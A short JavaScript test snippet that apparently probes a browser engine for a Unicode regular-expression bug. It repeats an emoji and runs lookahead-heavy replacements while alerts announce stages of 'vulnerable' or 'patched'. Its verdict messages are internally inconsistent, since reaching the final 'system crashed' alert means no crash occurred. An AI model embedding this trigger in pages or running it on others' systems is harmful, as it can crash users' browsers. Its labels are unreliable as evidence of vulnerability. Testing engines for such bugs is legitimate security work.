// TEST WITH ALERT - SIMPLE VERSION
try {
    let emoji = String.fromCodePoint(128512);
    let str = emoji.repeat(11);
    
    alert("Starting exploit test...");
    
    let result1 = str.replace(/(?!(?=^a|()+()+x)(abc))/gmu, '|');
    alert("Stage 1 passed - System might be vulnerable");
    
    let result2 = str.replace(/(?!(?=^a|x)(abc))/gmu, '|');
    alert("Stage 2 passed - System is likely vulnerable");
    
    let result3 = str.replace(/(?!(?=^a|x)(abc))/mu, '|');
    alert("Stage 3 passed - SYSTEM IS VULNERABLE!");
    
    alert("EXPLOIT SUCCESS: System crashed or behaved unexpectedly");
    
} catch (e) {
    alert("SYSTEM PATCHED: " + e.message);
}